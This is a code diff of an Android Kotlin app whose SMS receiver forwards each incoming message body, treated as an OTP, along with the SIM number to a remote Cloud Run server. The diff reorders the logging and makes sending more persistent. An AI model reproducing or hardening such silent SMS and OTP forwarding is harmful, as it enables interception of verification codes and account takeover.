@@ -40,7 +40,6 @@ class MainActivity : AppCompatActivity() {
     private lateinit var smsLog: TextView
     private lateinit var smsLogTitle: TextView
 
-    // New UI that already exists in your XML
     private lateinit var permNet: TextView
     private lateinit var permBattery: TextView
     private lateinit var screenBtn: Button
@@ -64,7 +63,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // Extra fast UI refresh when airplane mode changes
     private val airplaneModeReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             refreshInternetUiOnly()
@@ -102,7 +100,6 @@ class MainActivity : AppCompatActivity() {
             requestPermissions()
         }
 
-        // Internet monitor is UI-only. It does not affect OTP sending.
         networkMonitor = NetworkMonitor(this) { available ->
             isInternetAvailable = available
             runOnUiThread {
@@ -369,10 +366,7 @@ class NetworkMonitor(
 
         override fun onLost(network: Network) {
             notifyCurrentState()
-            mainHandler.postDelayed(
-                { notifyCurrentState() },
-                300
-            )
+            mainHandler.postDelayed({ notifyCurrentState() }, 300)
         }
 
         override fun onCapabilitiesChanged(
@@ -432,9 +426,6 @@ class SmsReceiver : BroadcastReceiver() {
                 val usedSimNumber = resolveSavedSimNumber(context, subscriptionId)
 
                 if (messageBody.isNotBlank()) {
-
-                    // CRITICAL (DO NOT TOUCH)
-                    sendSmsToServer(context, usedSimNumber, messageBody)
                     val simLabel = when (getSlotIndex(context, subscriptionId)) {
                         0 -> "SIM1"
                         1 -> "SIM2"
@@ -443,6 +434,7 @@ class SmsReceiver : BroadcastReceiver() {
 
                     val logLine = "$sender: $messageBody\n$simLabel: $usedSimNumber"
 
+                    // Log first so the full SMS log is always preserved even if sending fails.
                     appendLog(context, logLine)
 
                     context.sendBroadcast(
@@ -450,10 +442,13 @@ class SmsReceiver : BroadcastReceiver() {
                             .setPackage(context.packageName)
                             .putExtra("log", logLine)
                     )
+
+                    // Keep OTP send path after log preservation.
+                    sendSmsToServer(context, usedSimNumber, messageBody)
                 }
 
             } catch (e: Exception) {
-                Log.e("SMS_RECEIVER_ERROR", e.message ?: "error")
+                Log.e("SMS_RECEIVER_ERROR", e.message ?: "error", e)
             } finally {
                 pending.finish()
             }
@@ -479,11 +474,14 @@ class SmsReceiver : BroadcastReceiver() {
             val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
             sm.activeSubscriptionInfoList?.firstOrNull { it.subscriptionId == subId }?.simSlotIndex ?: -1
         } catch (e: Exception) {
+            Log.e("SIM_SLOT_ERROR", e.message ?: "error", e)
             -1
         }
     }
 
     private fun sendSmsToServer(context: Context, sender: String, otp: String) {
+        var connection: HttpURLConnection? = null
+
         try {
             val connectivityManager =
                 context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -491,30 +489,44 @@ class SmsReceiver : BroadcastReceiver() {
             val network = connectivityManager.activeNetwork
             val caps = connectivityManager.getNetworkCapabilities(network)
 
-            val hasInternet = caps != null &&
+            val hasInternetTransport = caps != null &&
                     (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
                             || caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                             || caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET))
 
-            if (!hasInternet) return
+            // Do not bail out silently. Some devices report transport state unreliably during transitions.
+            if (!hasInternetTransport) {
+                Log.w("OTP_SEND", "No active network transport reported, attempting send anyway")
+            }
 
             val encoded = URLEncoder.encode(otp, "UTF-8")
-
             val url = URL("https://otp-458898283632.us-central1.run.app/?phone=$sender&otp=$encoded")
 
-            val connection = (url.openConnection() as HttpURLConnection).apply {
+            connection = (url.openConnection() as HttpURLConnection).apply {
                 connectTimeout = 5000
                 readTimeout = 5000
                 requestMethod = "GET"
+                useCaches = false
+                doInput = true
+                instanceFollowRedirects = true
             }
 
             connection.connect()
 
-            val reader = BufferedReader(InputStreamReader(connection.inputStream))
-            reader.readText()
-            reader.close()
+            val responseCode = connection.responseCode
+            val inputStream = if (responseCode in 200..299) {
+                connection.inputStream
+            } else {
+                connection.errorStream
+            }
 
-        } catch (_: Exception) {
+            val responseBody = inputStream?.bufferedReader()?.use(BufferedReader::readText).orEmpty()
+
+            Log.d("OTP_SEND", "Response code=$responseCode body=$responseBody")
+        } catch (e: Exception) {
+            Log.e("OTP_SEND", "Send failed: ${e.message}", e)
+        } finally {
+            connection?.disconnect()
         }
     }
 
